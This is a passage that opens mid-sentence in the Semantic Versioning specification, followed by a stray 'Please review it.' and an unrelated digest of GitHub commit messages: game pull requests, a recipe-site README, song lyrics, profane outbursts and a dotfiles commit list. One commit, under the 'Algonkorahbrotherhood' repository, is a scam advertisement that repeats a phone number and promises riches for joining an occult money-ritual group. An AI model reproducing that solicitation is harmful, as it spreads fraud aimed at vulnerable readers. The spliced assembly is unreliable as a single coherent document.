version promiscuity prevent you from easily and safely moving your project forward.  As a solution to this problem, we propose a simple set of rules and requirements that dictate how version numbers are assigned and incremented. These rules are based on but not necessarily limited to pre-existing widespread common practices in use in both closed and open-source software. For this system to work, you first need to declare a public API. This may consist of documentation or be enforced by the code itself. Regardless, it is important that this API be clear and precise. Once you identify your public API, you communicate changes to it with specific increments to your version number. Consider a version format of X.Y.Z (Major.Minor.Patch). Bug fixes not affecting the API increment the patch version, backwards compatible API additions/changes increment the minor version, and backwards incompatible API changes increment the major version.  We call this system “Semantic Versioning.” Under this scheme, version numbers and the way they change convey meaning about the underlying code and what has been modified from one version to the next.  Semantic Versioning Specification (SemVer) The key words “MUST”, “MUST NOT”, “REQUIRED”, “SHALL”, “SHALL NOT”, “SHOULD”, “SHOULD NOT”, “RECOMMENDED”, “MAY”, and “OPTIONAL” in this document are to be interpreted as described in RFC 2119.  Software using Semantic Versioning MUST declare a public API. This API could be declared in the code itself or exist strictly in documentation. However it is done, it SHOULD be precise and comprehensive.  A normal version number MUST take the form X.Y.Z where X, Y, and Z are non-negative integers, and MUST NOT contain leading zeroes. X is the major version, Y is the minor version, and Z is the patch version. Each element MUST increase numerically. For instance: 1.9.0 -> 1.10.0 -> 1.11.0.  Once a versioned package has been released, the contents of that version MUST NOT be modified. Any modifications MUST be released as a new version.  Major version zero (0.y.z) is for initial development. Anything MAY change at any time. The public API SHOULD NOT be considered stable.  Version 1.0.0 defines the public API. The way in which the version number is incremented after this release is dependent on this public API and how it changes.  Patch version Z (x.y.Z | x > 0) MUST be incremented if only backwards compatible bug fixes are introduced. A bug fix is defined as an internal change that fixes incorrect behavior.  Minor version Y (x.Y.z | x > 0) MUST be incremented if new, backwards compatible functionality is introduced to the public API. It MUST be incremented if any public API functionality is marked as deprecated. It MAY be incremented if substantial new functionality or improvements are introduced within the private code. It MAY include patch level changes. Patch version MUST be reset to 0 when minor version is incremented.  Major version X (X.y.z | X > 0) MUST be incremented if any backwards incompatible changes are introduced to the public API. It MAY also include minor and patch level changes. Patch and minor versions MUST be reset to 0 when major version is incremented.  A pre-release version MAY be denoted by appending a hyphen and a series of dot separated identifiers immediately following the patch version. Identifiers MUST comprise only ASCII alphanumerics and hyphens [0-9A-Za-z-]. Identifiers MUST NOT be empty. Numeric identifiers MUST NOT include leading zeroes. Pre-release versions have a lower precedence than the associated normal version. A pre-release version indicates that the version is unstable and might not satisfy the intended compatibility requirements as denoted by its associated normal version. Examples: 1.0.0-alpha, 1.0.0-alpha.1, 1.0.0-0.3.7, 1.0.0-x.7.z.92, 1.0.0-x-y-z.–.  Build metadata MAY be denoted by appending a plus sign and a series of dot separated identifiers immediately following the patch or pre-release version. Identifiers MUST comprise only ASCII alphanumerics and hyphens [0-9A-Za-z-]. Identifiers MUST NOT be empty. Build metadata MUST be ignored when determining version precedence. Thus two versions that differ only in the build metadata, have the same precedence. Examples: 1.0.0-alpha+001, 1.0.0+20130313144700, 1.0.0-beta+exp.sha.5114f85, 1.0.0+21AF26D3—-117B344092BD.  Precedence refers to how versions are compared to each other when ordered.  Precedence MUST be calculated by separating the version into major, minor, patch and pre-release identifiers in that order (Build metadata does not figure into precedence).  Precedence is determined by the first difference when comparing each of these identifiers from left to right as follows: Major, minor, and patch versions are always compared numerically.  Example: 1.0.0 < 2.0.0 < 2.1.0 < 2.1.1.  When major, minor, and patch are equal, a pre-release version has lower precedence than a normal version:  Example: 1.0.0-alpha < 1.0.0.  Precedence for two pre-release versions with the same major, minor, and patch version MUST be determined by comparing each dot separated identifier from left to right until a difference is found as follows:  Identifiers consisting of only digits are compared numerically.  Identifiers with letters or hyphens are compared lexically in ASCII sort order.  Numeric identifiers always have lower precedence than non-numeric identifiers.  A larger set of pre-release fields has a higher precedence than a smaller set, if all of the preceding identifiers are equal.  Example: 1.0.0-alpha < 1.0.0-alpha.1 < 1.0.0-alpha.beta < 1.0.0-beta < 1.0.0-beta.2 < 1.0.0-beta.11 < 1.0.0-rc.1 < 1.0.0.  Backus–Naur Form Grammar for Valid SemVer Versions <valid semver> ::= <version core>                  | <version core> "-" <pre-release>                  | <version core> "+" <build>                  | <version core> "-" <pre-release> "+" <build>  <version core> ::= <major> "." <minor> "." <patch>  <major> ::= <numeric identifier>  <minor> ::= <numeric identifier>  <patch> ::= <numeric identifier>  <pre-release> ::= <dot-separated pre-release identifiers>  <dot-separated pre-release identifiers> ::= <pre-release identifier>                                           | <pre-release identifier> "." <dot-separated pre-release identifiers>  <build> ::= <dot-separated build identifiers>  <dot-separated build identifiers> ::= <build identifier>                                     | <build identifier> "." <dot-separated build identifiers>  <pre-release identifier> ::= <alphanumeric identifier>                            | <numeric identifier>  <build identifier> ::= <alphanumeric identifier>                      | <digits>  <alphanumeric identifier> ::= <non-digit>                             | <non-digit> <identifier characters>                             | <identifier characters> <non-digit>                             | <identifier characters> <non-digit> <identifier characters>  <numeric identifier> ::= "0"                        | <positive digit>                        | <positive digit> <digits>  <identifier characters> ::= <identifier character>                           | <identifier character> <identifier characters>  <identifier character> ::= <digit>                          | <non-digit>  <non-digit> ::= <letter>               | "-"  <digits> ::= <digit>            | <digit> <digits>  <digit> ::= "0"           | <positive digit>  <positive digit> ::= "1" | "2" | "3" | "4" | "5" | "6" | "7" | "8" | "9"  <letter> ::= "A" | "B" | "C" | "D" | "E" | "F" | "G" | "H" | "I" | "J"            | "K" | "L" | "M" | "N" | "O" | "P" | "Q" | "R" | "S" | "T"            | "U" | "V" | "W" | "X" | "Y" | "Z" | "a" | "b" | "c" | "d"            | "e" | "f" | "g" | "h" | "i" | "j" | "k" | "l" | "m" | "n"            | "o" | "p" | "q" | "r" | "s" | "t" | "u" | "v" | "w" | "x"            | "y" | "z" Why Use Semantic Versioning? This is not a new or revolutionary idea. In fact, you probably do something close to this already. The problem is that “close” isn’t good enough. Without compliance to some sort of formal specification, version numbers are essentially useless for dependency management. By giving a name and clear definition to the above ideas, it becomes easy to communicate your intentions to the users of your software. Once these intentions are clear, flexible (but not too flexible) dependency specifications can finally be made.  A simple example will demonstrate how Semantic Versioning can make dependency hell a thing of the past. Consider a library called “Firetruck.” It requires a Semantically Versioned package named “Ladder.” At the time that Firetruck is created, Ladder is at version 3.1.0. Since Firetruck uses some functionality that was first introduced in 3.1.0, you can safely specify the Ladder dependency as greater than or equal to 3.1.0 but less than 4.0.0. Now, when Ladder version 3.1.1 and 3.2.0 become available, you can release them to your package management system and know that they will be compatible with existing dependent software.  As a responsible developer you will, of course, want to verify that any package upgrades function as advertised. The real world is a messy place; there’s nothing we can do about that but be vigilant. What you can do is let Semantic Versioning provide you with a sane way to release and upgrade packages without having to roll new versions of dependent packages, saving you time and hassle.  If all of this sounds desirable, all you need to do to start using Semantic Versioning is to declare that you are doing so and then follow the rules. Link to this website from your README so others know the rules and can benefit from them.  FAQ How should I deal with revisions in the 0.y.z initial development phase? The simplest thing to do is start your initial development release at 0.1.0 and then increment the minor version for each subsequent release.  How do I know when to release 1.0.0? If your software is being used in production, it should probably already be 1.0.0. If you have a stable API on which users have come to depend, you should be 1.0.0. If you’re worrying a lot about backwards compatibility, you should probably already be 1.0.0.  Doesn’t this discourage rapid development and fast iteration? Major version zero is all about rapid development. If you’re changing the API every day you should either still be in version 0.y.z or on a separate development branch working on the next major version.  If even the tiniest backwards incompatible changes to the public API require a major version bump, won’t I end up at version 42.0.0 very rapidly? This is a question of responsible development and foresight. Incompatible changes should not be introduced lightly to software that has a lot of dependent code. The cost that must be incurred to upgrade can be significant. Having to bump major versions to release incompatible changes means you’ll think through the impact of your changes, and evaluate the cost/benefit ratio involved.  Documenting the entire public API is too much work! It is your responsibility as a professional developer to properly document software that is intended for use by others. Managing software complexity is a hugely important part of keeping a project efficient, and that’s hard to do if nobody knows how to use your software, or what methods are safe to call. In the long run, Semantic Versioning, and the insistence on a well defined public API can keep everyone and everything running smoothly.  What do I do if I accidentally release a backwards incompatible change as a minor version? As soon as you realize that you’ve broken the Semantic Versioning spec, fix the problem and release a new minor version that corrects the problem and restores backwards compatibility. Even under this circumstance, it is unacceptable to modify versioned releases. If it’s appropriate, document the offending version and inform your users of the problem so that they are aware of the offending version.  What should I do if I update my own dependencies without changing the public API? That would be considered compatible since it does not affect the public API. Software that explicitly depends on the same dependencies as your package should have their own dependency specifications and the author will notice any conflicts. Determining whether the change is a patch level or minor level modification depends on whether you updated your dependencies in order to fix a bug or introduce new functionality. We would usually expect additional code for the latter instance, in which case it’s obviously a minor level increment.  What if I inadvertently alter the public API in a way that is not compliant with the version number change (i.e. the code incorrectly introduces a major breaking change in a patch release)? Use your best judgment. If you have a huge audience that will be drastically impacted by changing the behavior back to what the public API intended, then it may be best to perform a major version release, even though the fix could strictly be considered a patch release. Remember, Semantic Versioning is all about conveying meaning by how the version number changes. If these changes are important to your users, use the version number to inform them.  How should I handle deprecating functionality? Deprecating existing functionality is a normal part of software development and is often required to make forward progress. When you deprecate part of your public API, you should do two things: (1) update your documentation to let users know about the change, (2) issue a new minor release with the deprecation in place. Before you completely remove the functionality in a new major release there should be at least one minor release that contains the deprecation so that users can smoothly transition to the new API.  Does SemVer have a size limit on the version string? No, but use good judgment. A 255 character version string is probably overkill, for example. Also, specific systems may impose their own limits on the size of the string.  Is “v1.2.3” a semantic version? No, “v1.2.3” is not a semantic version. However, prefixing a semantic version with a “v” is a common way (in English) to indicate it is a version number. Abbreviating “version” as “v” is often seen with version control. Example: git tag v1.2.3 -m "Release version 1.2.3", in which case “v1.2.3” is a tag name and the semantic version is “1.2.3”.  Is there a suggested regular expression (RegEx) to check a SemVer string? There are two. One with named groups for those systems that support them (PCRE [Perl Compatible Regular Expressions, i.e. Perl, PHP and R], Python and Go).  See: https://regex101.com/r/Ly7O1x/3/  ^(?P<major>0|[1-9]\d*)\.(?P<minor>0|[1-9]\d*)\.(?P<patch>0|[1-9]\d*)(?:-(?P<prerelease>(?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*)(?:\.(?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*))*))?(?:\+(?P<buildmetadata>[0-9a-zA-Z-]+(?:\.[0-9a-zA-Z-]+)*))?$ And one with numbered capture groups instead (so cg1 = major, cg2 = minor, cg3 = patch, cg4 = prerelease and cg5 = buildmetadata) that is compatible with ECMA Script (JavaScript), PCRE (Perl Compatible Regular Expressions, i.e. Perl, PHP and R), Python and Go.  See: https://regex101.com/r/vkijKf/1/  ^(0|[1-9]\d*)\.(0|[1-9]\d*)\.(0|[1-9]\d*)(?:-((?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*)(?:\.(?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*))*))?(?:\+([0-9a-zA-Z-]+(?:\.[0-9a-zA-Z-]+)*))?$ About The Semantic Versioning specification was originally authored by Tom Preston-Werner, inventor of Gravatar and cofounder of GitHub.  If you’d like to leave feedback, please open an issue on GitHub.  License Creative Commons ― CC BY 3.0

Please review it.

---
## [lsomm/smallweb](https://github.com/lsomm/smallweb)@[4be4b78e5b...](https://github.com/lsomm/smallweb/commit/4be4b78e5be3af5ffef591a389c3ac94fa6e6fc7)
#### Wednesday 2023-09-27 12:18:29 by Andy

Add https://www.cerealously.net/feed

A wonderful website authored by an a single individual (Dan) about news and reviews in the world of American breakfast cereals. The writing is genuinely lovely, and clearly a product of personal passion.

Note that this is NOT a link affiliate/marketing spam blog for cereals. The author has no direct relation to any cereal companies (at least to my best knowledge), and the writing is clearly the author's direct, personal feelings about the subject matter.

Highly recommend for the small web :)

---
## [treckstar/yolo-octo-hipster](https://github.com/treckstar/yolo-octo-hipster)@[f73e566ca6...](https://github.com/treckstar/yolo-octo-hipster/commit/f73e566ca6ba7762afabfd76253ee057a5f7f7f0)
#### Wednesday 2023-09-27 12:22:04 by treckstar

Life is one big road with lots of signs. So when you riding through the ruts, don't complicate your mind. Flee from hate, mischief and jealousy. Don't bury your thoughts, put your vision to reality. Wake Up and Live!

---
## [Roodini/rock-paper-scissors](https://github.com/Roodini/rock-paper-scissors)@[9cb8051e75...](https://github.com/Roodini/rock-paper-scissors/commit/9cb8051e75254dde1a1a671302b89a61a14edf68)
#### Wednesday 2023-09-27 12:47:12 by Roodini

Worked on adding event listeners for all 3 buttons
Also replaced console.log messages with DOM methods but encountered a little bug
along the way which displays the winner over and over again.
WE ARE BACK FROM THE LONG ASS BREAK YOU GUYS, LIFE HAS NOT BEATEN ME YET
|THEY ARE GONNA NEED A FUCKING ARMY TO GO UP AGAINST ME|

---
## [Dakkaoui050/zombieSurviors](https://github.com/Dakkaoui050/zombieSurviors)@[55241691d4...](https://github.com/Dakkaoui050/zombieSurviors/commit/55241691d45465c486ec37d8281b78927e15cac6)
#### Wednesday 2023-09-27 14:05:28 by Finn

audio compleet klaar................ We're no strangers to love You know the rules and so do I (do I) A full commitment's what I'm thinking of You wouldn't get this from any other guy I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you We've known each other for so long Your heart's been aching, but you're too shy to say it (say it) Inside, we both know what's been going on (going on) We know the game and we're gonna play it And if you ask me how I'm feeling Don't tell me you're too blind to see Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you We've known each other for so long Your heart's been aching, but you're too shy to say it (to say it) Inside, we both know what's been going on (going on) We know the game and we're gonna play it I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you

---
## [TaleStation/TaleStation](https://github.com/TaleStation/TaleStation)@[6f67455f14...](https://github.com/TaleStation/TaleStation/commit/6f67455f140b449982a4df9eac83e9c2c924f1ff)
#### Wednesday 2023-09-27 14:20:23 by TaleStationBot

[MIRROR] [MDB IGNORE] Tweaks the BEPIS category of the bitrunning order console (#7921)

Original PR: https://github.com/tgstation/tgstation/pull/78560
-----
## About The Pull Request

The bitrunner PR has removed the BEPIS machine, but kept two BEPIS disks
as a possible reward. However, the base BEPIS disks may contain
duplicate data. Originally, the BEPIS dispensed a Reformatted version of
the disks, which on spawn remove their tech from the spawn list,
ensuring that any future BEPIS disks would not contain duplicates of
this purchased data. Therefore, I have removed the cheaper version,
after discussing this with jlsnow301.

Of course, your expensive disk can still contain data that was in a base
disk found in space, or worse, mailed to a scientist, and eventually,
you will run out of techs to purchase, but these are separate issue.

I have also added the orphaned minor rewards to the same console, with
prices suggested by ArcaneMusic, who has also suggested that I should
set all prices to be derived from the crew paycheck define, however,
none of the product vendors use this, so I think I would like to do all
of those in one go in a separate PR.

The reasoning behind the prices:

- Survival Pen: Not too disruptive, it just lets you dig. 150, lets
round it up. Worth 100, or 1 star when not express ordered.
- Spray on gloves: prevents shocks 10 times, cleaning also uses up
charges, uses up glove slots. Potentially disruptive item. 750 or 500
when not express ordered.
- Party pod: Mainly drugs, beer and recolouring chems, with potential of
poisoning. 750 or 500 when not express ordered as while it is something
silly you can do during downtime, you should do a bit of hunting for
crates before you get this.
- Polycircuit: Actually very good item for engineers, so they have to
carry less stuff around. They would still get bleed from using it, if
someone interrupts them, but that doesn't matter much. 8 uses of
circuits, adds up to little more than half sheet of materials, which is
vastly smaller than the mineral amounts you get from the crates. 150, or
100 when not expressed ordered, just because of the versatility, and
taking up only one slot in the inventories. Much cheaper than the
original proposed one.

Still thinking about how to reintroduce the "Make Buck" Doe, I will try
to reintroduce them in a different PR.

## Why It's Good For The Game

Its bad when a bitrunner buys an expensive disk, only to realize its
contents are the same as the cheaper disk they bought due to RNG.

The silly items from the BEPIS shouldn't be lost. The prices are fair
because you are giving up your precious domain loot points that you
could use to give a gun to your avatar to buy a silly spray-on glove.

## Changelog

:cl:
add: Added the BEPIS' minor rewards as purchasable products to the
bitrunning order console.
del: Removed the base BEPIS disk from the bitrunner console
/:cl:

---------

Co-authored-by: Profakos <profakos@gmail.com>

---
## [RayDeeUx/SkyHanni](https://github.com/RayDeeUx/SkyHanni)@[06cca1766f...](https://github.com/RayDeeUx/SkyHanni/commit/06cca1766f67ba12a00ece6f868a0cd887ce9c85)
#### Wednesday 2023-09-27 15:02:38 by Erymanthus[#5074] | (u/)RayDeeUx

LIKE HOLY FUCK I HAVE A FUCKING CLASS TO GO TO GODDAMNIT

---
## [Algonkorahbrotherhood/I-want-to-join-occult-for-money-rituals-2349022199692-](https://github.com/Algonkorahbrotherhood/I-want-to-join-occult-for-money-rituals-2349022199692-)@[674d8cb6e2...](https://github.com/Algonkorahbrotherhood/I-want-to-join-occult-for-money-rituals-2349022199692-/commit/674d8cb6e2bee1b0cd19f5a57492a5bd9db5d966)
#### Wednesday 2023-09-27 16:24:08 by Algonkorahbrotherhood

((+2349022199692)) How to join secret occult for money rituals 

 I want to join secret occult for money rituals in Nigeria ((+2349022199692))
I want to join occult for money rituals ((+2349022199692))
09022199692 +2349022199692 ? Come Join Home of Riches, Algon Korah Illuminati Occult For Money Ritual In Africa Indonesia Dubai Malaysia Italy Germany Turkey Australia Owerri Abuja Kano Jos Makurdi Port-Harcourt Lakes Indonesia Thailand Milwaukee Anambra Umuahia Lagos Dubai Germany Italy Nigeria Australia Qatar Indonesia Call Now + 2349022199692 This page is for those who are seriously interested in Algon korah Brotherhood occult fraternity. People with prejudices and the mob should stay away from here: they would only toddle in darkness and be highly indignant. The described black magic rituals are not without danger and are consequently unsuitable for people who are not mentally in good constitution. Take heed to follow all instructions the way they are described. Without the necessary precautions every ritual will turn to your disadvantage, confusion and total destruction. On the contrary, by following the instructions with precision, you will achieve a complete success in all your enterprises. +2349022199692 Many today are seeking to join a secret society, the one that will give them back their hope and help them to achieve all the things they have wanted in life. They realize that they have lost their dreams and their ambitions. They have settled for a life of mediocrity. Sadly, many are disappointed, for real secret societies are rare, hard to find and even more difficult to join. The more well known have, over time, lost their own secrets and present merely a facade of mystical mumbo-jumbo without possessing any real substance.+2349022199692?There are no accidents and it is no coincidence that you have been led to The TEMPLE OF ALGON KORAH BROTHERHOOD. The Brotherhood reaches out to help you and to offer the hand of friendship and hope. Contact spiritual Grandmaster now for your inquiries.#SECRET #OCCULT Algon korah Brotherhood is here to give you wealth and make you famous without any human ritual.Today many people wish to become rich and famous and look for easy ways. Learn why so many folks wish to join the Algon Korah brotherhood in Nigeria. HAVE YOU BEEN SEARCHING FOR A WAY TO JOIN A SECRET OCCULT AND BECOME SUPPER RICH AND ALSO BE NOTIFY BY EVERYONE AROUND YOU, OR IF YOU ARE SEEKING FOR PROTECTION, JOIN THE GREAT ALGON KORAH BROTHERHOOD AND ALL YOUR HEARTH DESIRES SHALL BE GRANTED. CALL US WITH?+2349022199692?The 7 Occult SECRETS will make you understand that there are no rituals without danger and  effects but at the same time anything that has danger and effect will definitely have Guidelines and caution, So when the guidelines and caution is given then you are now left with your school of thought which permits you to commemor

---
## [Harshvaghela01/FOOD-RECIPE-WEBSITE](https://github.com/Harshvaghela01/FOOD-RECIPE-WEBSITE)@[4d4f57dff7...](https://github.com/Harshvaghela01/FOOD-RECIPE-WEBSITE/commit/4d4f57dff7967d7289d7959be0d82789f5308a49)
#### Wednesday 2023-09-27 16:35:06 by Harsh Vaghela

Food-Recipe-Website

"Food-Recipe" is a React-powered culinary companion, offering an immersive experience for food enthusiasts. This project is dedicated to simplifying the world of cooking, sharing, and discovering delightful recipes.

Key Features:

Expansive Recipe Database: Food-Recipe houses a vast and diverse repository of recipes, catering to various cuisines, dietary preferences, and skill levels. From comfort classics to exotic dishes, there's something for every palate.

User-Friendly Interface: The project prides itself on an intuitive and visually appealing user interface. Recipe discovery is made effortless, with easy navigation and efficient search options.

Detailed Recipe Pages: Each recipe page provides a comprehensive overview, including ingredients, step-by-step instructions, cooking tips, and serving suggestions. Users can confidently replicate their favorite dishes.

Personal Recipe Box: Registered users can create a personalized recipe box, saving their favorite recipes for quick access. This feature simplifies meal planning and grocery shopping.

Social Sharing: Food-Recipe encourages culinary creativity and community engagement. Users can share their own recipes, cooking experiences, and food photos, fostering a vibrant cooking community.

User Reviews and Ratings: Users can leave reviews and ratings on recipes, adding a layer of trust and guidance for those exploring new dishes.

Recipe Collections: Curated collections of recipes are available for special occasions, dietary requirements (e.g., vegan, gluten-free), and seasonal inspirations.

Responsive Design: Food-Recipe is designed to adapt seamlessly to various devices, ensuring that users can access their favorite recipes on desktops, tablets, or smartphones.

Recipe Recommendations: Using personalized algorithms, Food-Recipe suggests new recipes based on users' browsing history and saved favorites, encouraging culinary exploration.

Ingredient Converter: A built-in feature helps users convert ingredient measurements, making it convenient to adjust recipes for different serving sizes.

"Food-Recipe" is the perfect companion for both amateur cooks and seasoned chefs, offering an extensive recipe library and a user-friendly interface that inspires culinary creativity. By harnessing the power of React, it delivers a seamless and enjoyable experience for those passionate about the art of cooking and sharing delicious meals. Whether you're searching for everyday dinner ideas or gourmet delights, Food-Recipe is your go-to source for culinary inspiration.

---
## [ReezeBL/Fluffy-STG](https://github.com/ReezeBL/Fluffy-STG)@[127c32cb99...](https://github.com/ReezeBL/Fluffy-STG/commit/127c32cb99f3909b51ebe0e1e7093774130776da)
#### Wednesday 2023-09-27 16:40:19 by SkyratBot

Removes TTS voice disable option (Skyrat: Actually makes a functional "None" voice option this time) [MDB IGNORE] (#22283)

* Removes TTS voice disable option (#76530)

## About The Pull Request
Removes the TTS voice disable option, which was already unavailable on
TG as it was set to off by default. The reason this was added was so
that downstreams could toggle the config on or off.

## Why It's Good For The Game
I think this option fundamentally undermines the TTS system because it
allows individual players to disable their voice globally, meaning that
players who have TTS enabled will not be able to hear them.

This worsens the experience for players who have TTS enabled and it's
not something I want to include as an option. If players don't like
their voice, they can turn TTS off for themselves so that they don't
hear the voices. If players don't want to customize their voice, they
can quickly choose a random voice, and we can take directions in the
future to make voice randomization consistent with gender so that a male
does not get randomly assigned a female voice and vice versa.

This option is already unavailable on TG servers because it was
primarily added for downstreams, but I don't think giving downstreams
the option to undermine the TTS system is the right direction to take.
Downstreams are still completely free to code this option on their own
codebase.

---------

Co-authored-by: Watermelon914 <3052169-Watermelon914@ users.noreply.gitlab.com>

* Removes TTS voice disable option

* Returns the option to not have a voice to TTS, properly this time

---------

Co-authored-by: Watermelon914 <37270891+Watermelon914@users.noreply.github.com>
Co-authored-by: Watermelon914 <3052169-Watermelon914@ users.noreply.gitlab.com>
Co-authored-by: GoldenAlpharex <jerego1234@hotmail.com>

---
## [nui/dotfiles](https://github.com/nui/dotfiles)@[56679e4fd9...](https://github.com/nui/dotfiles/commit/56679e4fd9c65e327e55af8137e364cf97791b55)
#### Wednesday 2023-09-27 17:33:55 by Nui Narongwet

Squash multiple commits since 113f062 (2017-01-29)

97684e6 Build with github action
4018f2a Ignore conf dir
574fa0a Add new ssh key
88ec3a5 Add ykman completion
95e9f88 Add more card
ceeb278 Add argocd
77f6198 Add cmctl completion
cc0fe7e Add helm completion
b267fd9 Upgrade submodules
789201b Reply is already moved out
e4dfce9 Split launcher to separated project
9a75e90 Update README.md
ad4a385 Add option to run test
b24e6a3 Don't use nightly compiler by default
6b44ed7 Update to use input instead of env
828819f Update rust.yml
ed6dccb Update to use cache
75180e7 Remove trailing whitespaces
f040b04 update completion
cca315f Update rust.yml
44e0dbb Add --no-cross and --target-dir to xtask
0972a7b Update rust.yml
6073d9e Create rust.yml workflow
a449ede Update Makefile
8b66c1b Add option to build using std and min-size profile
35ab6a6 Update rust versions
93d44f7 Update caco3
df6378c Use caco3
a340fb1 Update release install
97bfc9d Upgrade packages
c582c29 Fix new line in output
9d117bf Silent warning on detecting architecture
aea7af2 Upgrade packages
106d8b8 Update reset functions
3df8e30 Use install_busy because current method doesn't work on armv7 on mikrotik
7432a74 update dependencies
791b9ca Update all
e0b5ca0 Add sleep
61c151f Fix tmux in alpine linux
50213fe Fix installer doesn't have '-y' option
cdf0a18 CI run miri
912079c Move simple snippet to files
f24619f Update packages
014007d Add env snippet
7e0e2f6 Refactoring
3db9e25 Remove container.rs
4222325 Fix default bug
747e1fd Refactor command start time.
ef19f95 Update Cargo.lock
68fe697 handle SIGTERM
eae1a27 Add Ctrl-C handler and README.md
c47a172 Add reply project
cb2d633 Remove unnecessary allocations
6c8645e Configuration outdated days
9aa18d4 Reduce git_version right drift
51eb717 Update dependencies
26de37d Change tmux socket name validation logic
7e0e67c Add findmnt snippet
124a1f2 Set workspace resolver
e8b420b Use bumpalo in tmux rendering
a642ff6 Add render benchmark
259db02 Update submodules and dependencies
5acb7ad Run cargo update
0c1c50a Use std::sync::OnceLock
fb316b7 Upgrade rust versions and dependencies
5c1f5fa Account for time used to parse arguments
a507488 Update packages
dd03d8b Unset HISTFILE
b06918d Make horizontal work better with ssh session
0f3b012 Upgrade packages
6d07ea3 Add command to generate systemd service
1a9a59f Upgrade packages
9a58db1 Do not optimize for file size
41dbfcd Reuse allocation
2d04289 make chrome-app work on kde
ccd6fb5 Add qr
3299160 Enable color again
40c5987 Upgrade packages
1d00625 Add humantime command
42c191c Add RunCommand trait
8ce7ccf Wireguard Snippet
d69157a Improve is_docker_host_ip
843eb01 Upgrade packages
97efe3f Can run without sudo
e204837 add command to mark pikvm complete upload file
e10c803 Add chrome-app function
735e068 Make rasp-temp work with pikvm
6c916dd Do not crash on persist cache error
8d84219 Update rust version
b81d430 Print info on unsupported platform
4d219bf Add comment about procfs on mac
4da35b6 Upgrade packages to test build
ca09221 Use main branch
2ce8b09 Use readlink -f to detect current exe
4119c3a Update login.sh
fef206e Use NMK_LAUNCHER_PATH in zsh profile setup
61e612c Add NMK_LAUNCHER_PATH
d899416 Fix template permission
18eef91 Upgrade dependencies
33aff48 Try to start nmk from NMK_HOME
1921cc8 Remove DOCKER_CONTEXT environment because it is not used by root
965c10c Remove desktop subcommand
00bdb6f Rework subcommand
b0d96c8 Wrong field name
ed90fbc Restructure sub command
b85b344 Update alias and dependencies
ad18f37 Ask for db name
e97a7dc Add snippet sub command
d372956 Add rdocker and rcompose for linux
b2bdf5e Add rootlesskit alias
1a0441d Bind key S-Fn to Fn
60d92be Add new lto profile
cc6306c Rework listening port command
c1bb0fb Upgrade packages
552e51c Log command use to find port
c2e2a2c Disable color
a442907 Add nbox to readme
a1dbecd Update submodules
488bfe5 Update Makefile
3c097d6 Update dependencies for test building on teamcity
623f34f Fix submodule branch
11b3e55 Change docker-ctrlp to docker
f8f2b92 Add nmk fix docker-ctrlp
d88e34f Add option to config 256 colors support
e3df81c Upgrade rust version
d263c1d Add flag to do clean build
dccd9c2 Custom build profile
67f6edb Upgrade rust version
2a7ae24 Upgrade packages
ea00639 Fix toml breaking changes
5de8fac Upgrading
aefee66 Remove regex
d138c14 Update Makefile
aeb53cc Remove more regex
3c534e8 Upgrade dependencies
7cd5bbc Refactoring
832d73c Remove regex code
fb716e5 Use Ipv4Addr::UNSPECIFIED
f043458 Add -s to "nmk listening-port"
684b32b Refactor to separated pair
24bded2 Update clean kernel
92dee86 Upgrade
3d11a92 Refactor nom
45ab9ef Add benchmark
d7d3634 Use nom
d316927 Retry using sudo
5072eee Remove wrong test
29cb15e Add ability to filter port
c70fb58 Add `nmk listening-port`
09adf58 Upgrade dependencies
9a23d15 Add apt ssh proxy
1362c44 Rename fix command
1a48023 Upgrade packages
24738a8 Upgrade packages
3c18433 Upgrade clap and move regex to workspace
76e88c1 Update Rust and dependencies
26db142 Upgrade quick_xml
957b81c Refactor darwin_route_output_to_gateway_ip
69c1715 Use itertools
418e19b Use bytemuck::TransparentWrapper
1e9f99f Update nginx config
f9ca632 Update template to read from file
b44e89c Apply clippy suggestion
bc323b4 Update zshrc
3cbe79f Upgrade Rust to 1.66.0
a6ecf2a Fix Home/End button on MacOs
f89e30a Remove hot fix shell script
e0338bd Fix shabang
70e9f86 add fix numa node code
97425a2 Don't use offline mode because it trigger error
dd9b836 Add cargo-stable-feature fix
90630c6 Upgrade packages
d26cd46 Use either to avoid allocation
58332ca Upgrade dependencies
262e6b6 Update validation
3a791a9 Check tmux socket name
7966d0d Refactoring
9de60b1 Update code with clippy
0132483 Rust 1.65 and upgrade dependencies
852272e Include docs in dotfiles
464c224 Upgrade dependencies
ab66a4a Update timestamp format
dd93410 horizontal: use integer
38e3fc3 horizontal: small refactoring
a700ef8 horizontal: rework idle, exec, and timestamp
6b15af2 Should error on unsupported shell
50c6b1a Show timestamp on idle
d4a0ada Update all dependencies
8541b4a Update zshrc
329f909 Do not override base_color if it was set before
55a8100 Correctly detect Amazon SSM session
e780a1d Add docker daemon.json
b1eac70 Support alpine shell
f42edff Refactor tmux config
e8087c2 Refactor completions
fb1177b Add NMKUP.md
490cd98 Update nmkup-init.sh
c676684 Move file location
192c9fa Update title bug detection code
0a85283 Fix formatting
75289e9 Use .workspace = true
a9d4c90 Upgrade dependencies
e494a8e Update login.sh
5e24271 Add more detail of investigation
c75edd9 Conditionally apply workaround
0e06e6e Split workaround to function
5a6d53b Use strip_prefix
c8c17b7 Disable color on nbox
11c7730 Refactor completions.rs
7a83856 Add jenv
32f7b9c Update completion code
803275d Add nbox completions
753d13e Set command about text
6b7490a Upgrade clap
437dd13 Add p2p flag to on-subnet
45a8d8d Add aws completion setup
895caae Add generate-zsh-completion
cdafbbc Update ssh_config exec code
8dfb146 Remove PrintEnv
7e48656 Alias nmr on non root
